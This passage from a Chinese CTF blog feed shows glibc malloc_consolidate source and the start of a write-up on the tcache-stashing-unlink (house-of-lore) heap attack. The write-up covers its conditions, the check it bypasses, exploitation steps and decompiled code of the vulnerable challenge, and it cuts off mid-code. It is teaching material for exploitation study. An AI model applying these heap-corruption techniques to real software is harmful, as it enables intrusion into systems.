number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   p <span class=\"token operator\">=</span> <span class=\"token function\">atomic_exchange_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>     <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> idx <span class=\"token operator\">=</span> <span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> fb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t    <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_consolidate(): invalid chunk size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">check_inuse_chunk</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tnextp <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token comment\">/* Slightly streamlined version of consolidation code in free() */</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tnextchunk <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tnextsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t  prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t  p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t  <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t  nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t    <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t  first_unsorted <span class=\"token operator\">=</span> unsorted_bin<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t  unsorted_bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t  first_unsorted<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t    p<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t    p<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t  p<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> unsorted_bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t  p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> first_unsorted<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t  <span class=\"token function\">set_foot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t  av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> nextp<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>   <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>fb<span class=\"token operator\">++</span> <span class=\"token operator\">!=</span> maxfb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure></blockquote>\n",
            "tags": [
                "house系列",
                "house-of-rabbit"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/",
            "url": "https://yhuanhuan01.github.io/2024/07/22/tcache-stashing-unlink-attack(house-of-lore)/",
            "title": "tcache-stashing-unlink-attack(house-of-lore)",
            "date_published": "2024-07-22T10:44:49.000Z",
            "content_html": "<h1 id=\"tcache-stashing-unlink-attack\"><a class=\"markdownIt-Anchor\" href=\"#tcache-stashing-unlink-attack\">#</a> tcache-stashing-unlink-attack</h1>\n<blockquote>\n<p>house-of-lore 结合 tcache 的一套攻击流程</p>\n</blockquote>\n<p>漏洞成因</p>\n<blockquote>\n<p>堆溢出、 <code>use after free</code> 、 <code>edit after free</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li><code>2.23</code> ——  <code>2.31</code></li>\n<li>需要泄露或已知地址</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>通 uaf 修改 smallbin 大小的 free_chunk 的 bk 指针到目的地址，同时伪造目的地址的 fd 指针指向将被 free 的 chunk。从而实现获取一个任意地址分配的能力</p>\n<h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__glibc_unlikely</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc(): smallbin double linked list corrupted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<ul>\n<li>申请  <code>chunk A、chunk B、chunk C</code> ，其中  <code>chunk B</code>  大小位于  <code>smallbin</code></li>\n<li>释放  <code>B</code> ，申请更大的  <code>chunk D</code> ，使得  <code>B</code>  进入  <code>smallbin</code></li>\n<li>写  <code>A</code> ，溢出修改  <code>B</code>  的  <code>bk</code> ，指向地址  <code>X</code> ，这里有  <code>fake chunk</code></li>\n<li>布置  <code>X-&gt;fd == &amp;B</code></li>\n<li>分配两次后即可取出位于  <code>X</code>  地址处的  <code>fake chunk</code></li>\n</ul>\n<blockquote>\n<p>需要越过 tcache 取 smallbin 的 free_chunk</p>\n</blockquote>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vdGNhY2hlLXN0YXNoaW5nLXVubGluay1hdHRhY2soaG91c2Utb2YtbG9yZSk=\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/tcache-stashing-unlink-attack(house-of-lore)</span></p>\n<p><img data-src=\"/img/house-of-lore/image-20240722143535687.png\" alt=\"image-20240722143535687\"></p>\n<blockquote>\n<p>还是先申代码吧</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> <span class=\"token function\">sub_11D5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  sys_malloc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1000uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>sys_malloc <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  qword_4050 <span class=\"token operator\">=</span> sys_malloc <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFFFFFFFFFFFFF000LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">alarm</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1Eu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>初始化函数，程序自己申请了一个 <code>0x1000</code> chunk</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">seccomd_box</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        choice <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">!=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num_28 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token operator\">--</span>num_28<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_19<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">delect</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// uaf</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">==</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>LABEL_19<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token function\">read_overbuf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>             <span class=\"token comment\">// stack_read_overbuf</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>部分代码截取</p>\n<p>整体看一下，有沙盒，最多进入 add 28 次（有些已经注释过了一下</p>\n<ul>\n<li>add()</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 只列举比较重要的部分</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input the red packet idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">></span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0xF0</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0x300</span> <span class=\"token operator\">&amp;&amp;</span> v5 <span class=\"token operator\">!=</span> <span class=\"token number\">0x400</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// size_rule</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">calloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1uLL</span><span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// user_malloc</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>只能去申请 <code>4个大小</code> 的 chunk，并且都不在 largebin 的范围内</p>\n<ul>\n<li>delect</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token function\">read_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> num <span class=\"token operator\">></span> <span class=\"token number\">16</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">16LL</span> <span class=\"token operator\">*</span> num <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">puts_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span 